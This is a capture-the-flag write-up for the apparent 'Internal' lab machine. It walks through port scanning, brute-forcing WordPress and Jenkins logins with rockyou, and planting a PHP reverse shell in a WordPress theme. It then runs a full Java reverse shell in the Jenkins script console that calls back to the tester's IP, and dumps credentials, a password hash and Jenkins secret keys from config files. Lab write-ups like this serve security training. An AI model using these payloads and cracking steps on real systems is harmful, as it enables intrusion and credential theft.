# Internal

## nmap

nmap -n -p- -T5 -oN nmap.out internal.thm                                                                                                       130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-24 13:32 CET
Warning: 10.10.162.127 giving up on port because retransmission cap hit (2).
Nmap scan report for internal.thm (10.10.162.127)
Host is up (0.038s latency).
Not shown: 65529 closed ports
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
43479/tcp filtered unknown
50622/tcp filtered unknown
52391/tcp filtered unknown
59552/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 19.26 seconds

nmap --script http-enum -oN nmap-80.out -p80 internal.thm                                                                                       130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-24 13:33 CET
Nmap scan report for internal.thm (10.10.162.127)
Host is up (0.13s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /blog/: Blog
|   /phpmyadmin/: phpMyAdmin
|   /wordpress/wp-login.php: Wordpress login page.
|_  /blog/wp-login.php: Wordpress login page.

### PHPMYADMIN

In source code:
    PMA_VERSION:"4.6.6deb5"  // Current version 4.9.7

CVE-2017-18264 phpmyadmin bypass https://vuldb.com/es/?id.117253

#### Login page
Access denied for user 'wp'@'localhost' (using password: YES)
Access denied for user 'admin'@'localhost' (using password: YES)
Login without a password is forbidden by configuration (see AllowNoPassword)

### Wordpress

http://internal.thm/blog/readme.html
http://internal.thm/blog/wp-login.php

Using rrs feeds (http://internal.thm/blog/index.php/feed/) we can see the version:
    <generator>https://wordpress.org/?v=5.4.2</generator>

WP version: 5.4.2  // Current version 5.5.3
-- No current exploits or vulnerabilities found.

Lets run wpscan. 
admin user found. Trying to crack it with rockyou.
  wpscan -U admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50 --url internal.thm/blog -o wpscan_rockpass.out
  [!] Valid Combinations Found:
   | Username: admin, Password: my2boys


After being logged, a new post appeared:

    Private:
    To-Do
    Don’t forget to reset Will’s credentials. william:arnold147

But doesn't work anywhere.




## Getting shell

Uploading a reverseshell (https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) in the current theme of the wordpress (i.e. in the 404 page) we can get access as www-data. Let's research.
There is only one user in the server: aubreanna.

  $ cat passwd
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  sys:x:3:3:sys:/dev:/usr/sbin/nologin
  sync:x:4:65534:sync:/bin:/bin/sync
  games:x:5:60:games:/usr/games:/usr/sbin/nologin
  man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
  lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
  mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
  news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
  uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
  proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
  backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
  list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
  irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
  gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
  nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
  systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
  systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
  syslog:x:102:106::/home/syslog:/usr/sbin/nologin
  messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
  _apt:x:104:65534::/nonexistent:/usr/sbin/nologin
  lxd:x:105:65534::/var/lib/lxd/:/bin/false
  uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
  dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
  landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
  pollinate:x:109:1::/var/cache/pollinate:/bin/false
  sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
  aubreanna:x:1000:1000:aubreanna:/home/aubreanna:/bin/bash
  mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false


Found credentials for the phpmyadmin site, but there are not interesting things.
  $ cat /etc/wordpress/config-localhost.php    
  <?php
  define('DB_NAME', 'wordpress');
  define('DB_USER', 'wordpress');
  define('DB_PASSWORD', 'wordpress123');
  define('DB_HOST', 'localhost');
  define('DB_COLLATE', 'utf8_general_ci');
  define('WP_CONTENT_DIR', '/var/www/html/wordpress/wp-content');
  ?>

Found credentials for the mysql database
  $ cat config-db.php
  <?php
  ##
  ## database access settings in php format
  ## automatically generated from /etc/dbconfig-common/phpmyadmin.conf
  ## by /usr/sbin/dbconfig-generate-include
  ##
  ## by default this file is managed via ucf, so you shouldn't have to
  ## worry about manual changes being silently discarded.  *however*,
  ## you'll probably also want to edit the configuration file mentioned
  ## above too.
  ##
  $dbuser='phpmyadmin';
  $dbpass='B2Ud4fEOZmVq';
  $basepath='';
  $dbname='phpmyadmin';
  $dbserver='localhost';
  $dbport='3306';
  $dbtype='mysql';

Found something strange. Maybe another subnet
  $ cat /etc/hosts
  127.0.0.1 localhost
  127.0.1.1 internal

  # The following lines are desirable for IPv6 capable hosts
  ::1     ip6-localhost ip6-loopback
  fe00::0 ip6-localnet
  ff00::0 ip6-mcastprefix
  ff02::1 ip6-allnodes
  ff02::2 ip6-allrouters


### pspy64
Launching pspy64 we can see that maybe we're in a docker
  2020/11/24 16:14:36 CMD: UID=1000 PID=1500   | java -Duser.home=/var/jenkins_home -Djenkins.model.Jenkins.slaveAgentPort=50000 -jar /usr/share/jenkins/jenkins.war                                                                                                                                                  
  2020/11/24 16:14:36 CMD: UID=0    PID=15     | 
  2020/11/24 16:14:36 CMD: UID=1000 PID=1465   | /sbin/tini -- /usr/local/bin/jenkins.sh 
  2020/11/24 16:14:36 CMD: UID=0    PID=1426   | containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v1.linux/moby/7b979a7af7785217d1c5a58e7296fb7aaed912c61181af6d8467c062151e7fb2 -address /run/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-runc                                                                                                                                   
  2020/11/24 16:14:36 CMD: UID=0    PID=1413   | /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8080 -container-ip 172.17.0.2 -container-port 8080                    


[+] .sh files in path
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path                                                                   
/usr/bin/gettext.sh    


After more research, we found some interesting things in the /opt folder



$ ls -la /opt
  total 16
  drwxr-xr-x  3 root root 4096 Aug  3 03:01 .
  drwxr-xr-x 24 root root 4096 Aug  3 01:31 ..
  drwx--x--x  4 root root 4096 Aug  3 03:01 containerd
  -rw-r--r--  1 root root  138 Aug  3 02:46 wp-save.txt
$ cat /opt/wp-save.txt
  Bill,

  Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

  aubreanna:bubb13guM!@#123

  Got SSH!

## Getting root

After getting the user flag, we can see another file in our home:
  cat jenkins.txt 
  Internal Jenkins service is running on 172.17.0.2:8080
  aubreanna@internal:~$ curl  172.17.0.2:8080
  <html><head><meta http-equiv='refresh' content='1;url=/login?from=%2F'/><script>window.location.replace('/login?from=%2F');</script></head><body style='background-color:white; color:white;'>


  Authentication required
  <!--
  You are authenticated as: anonymous
  Groups that you are in:
    
  Permission you need to have (but didn't): hudson.model.Hudson.Read
   ... which is implied by: hudson.security.Permission.GenericRead
   ... which is implied by: hudson.model.Hudson.Administer
  -->

  </body></html>      

So let's run an SSH Tunnel:
  ssh -L 8080:172.17.0.2:8080 aubreanna@internal.thm
And now, in localhost:8080 (take care with BurpSuite default port) we've got a Jenkins site. Testing passwords with hydra can give us the key:

  hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&Submit=Sign+in:Invalid username or password" -v -s 8080
  Jenkins:
  [8080][http-post-form] host: 127.0.0.1   login: admin   password: spongebob

Now, logged on, go to "Manage Jenkins" and "Script console". Here we can run another reverse shell:
  String host="10.9.186.161";int port=8888;String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

  (niknitro㉿kali)-[~/thm/internal] nc -nlvp 8888                                                                                                   
  listening on [any] 8888 ...
  connect to [10.9.186.161] from (UNKNOWN) [10.10.162.127] 49750
  whoami
  jenkins

### Playing in our new machine

  >> cat /etc/passwd
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  sys:x:3:3:sys:/dev:/usr/sbin/nologin
  sync:x:4:65534:sync:/bin:/bin/sync
  games:x:5:60:games:/usr/games:/usr/sbin/nologin
  man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
  lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
  mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
  news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
  uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
  proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
  backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
  list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
  irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
  gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
  nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
  _apt:x:100:65534::/nonexistent:/bin/false
  jenkins:x:1000:1000::/var/jenkins_home:/bin/bash

  cat /var/jenkins_home/secret.key
  ff9d7e137411b61679dfe34a2a385ee066fcd850d0b97cbb2c319c2b4cad125f
  cat /var/jenkins_home/secrets/master.key
  5354f116835133ad1273b83a07d25e0eff524d19fcea2f5de32373169a7b0ef8b30e84a1b1b414e8bf9fc80f72f2ce6db34df700038fb76f73e74cd9ea4e8b3e998ed3f715e444ba6ada6ba9adce287001d496af0174a310a0ba90eec85f7d5bf092cace21f3fb76d9d8f96702897dae8b51c3f76c81b7db53c62c16360659bd

  cat  /var/jenkins_home/users/admin_3190494404640478712/users.xml
  <?xml version='1.1' encoding='UTF-8'?>
  <user>
    <version>10</version>
    <id>admin</id>
    <fullName>admin</fullName>
    <description></description>
    <properties>
      <jenkins.security.ApiTokenProperty>
        <tokenStore>
          <tokenList/>
        </tokenStore>
      </jenkins.security.ApiTokenProperty>
      <com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin="credentials@2.3.12">
        <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash"/>
      </com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty>
      <hudson.tasks.Mailer_-UserProperty plugin="mailer@1.32">
        <emailAddress>admin@internal.thm</emailAddress>
      </hudson.tasks.Mailer_-UserProperty>
      <hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty plugin="email-ext@2.71">
        <triggers/>
      </hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty>
      <jenkins.security.LastGrantedAuthoritiesProperty>
        <roles>
          <string>authenticated</string>
        </roles>
        <timestamp>1596424918020</timestamp>
      </jenkins.security.LastGrantedAuthoritiesProperty>
      <hudson.model.MyViewsProperty>
        <primaryViewName></primaryViewName>
        <views>
          <hudson.model.AllView>
            <owner class="hudson.model.MyViewsProperty" reference="../../.."/>
            <name>all</name>
            <filterExecutors>false</filterExecutors>
            <filterQueue>false</filterQueue>
            <properties class="hudson.model.View$PropertyList"/>
          </hudson.model.AllView>
        </views>
      </hudson.model.MyViewsProperty>
      <org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin="display-url-api@2.3.3">
        <providerId>default</providerId>
      </org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty>
      <hudson.model.PaneStatusProperties>
        <collapsed/>
      </hudson.model.PaneStatusProperties>
      <hudson.security.HudsonPrivateSecurityRealm_-Details>
        <passwordHash>#jbcrypt:$2a$10$MDKawySp3DRfUrrKFrBAe.o2D4qCzIJJaPpRfc3u2CR/w.NzbJjqe</passwordHash>
      </hudson.security.HudsonPrivateSecurityRealm_-Details>
      <org.jenkinsci.main.modules.cli.auth.ssh.UserPropertyImpl>
        <authorizedKeys></authorizedKeys>
      </org.jenkinsci.main.modules.cli.auth.ssh.UserPropertyImpl>
      <jenkins.security.seed.UserSeedProperty>
        <seed>d10eec67fb14d1f2</seed>
      </jenkins.security.seed.UserSeedProperty>
      <hudson.search.UserSearchProperty>
        <insensitiveSearch>true</insensitiveSearch>
      </hudson.search.UserSearchProperty>
      <hudson.model.TimeZoneProperty>
        <timeZoneName></timeZoneName>
      </hudson.model.TimeZoneProperty>
    </properties>


$ cat /opt/note.txt
  cat /opt/note.txt
  Aubreanna,

  Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
  need access to the root user account.

  root:tr0ub13guM!@#123

We got it.
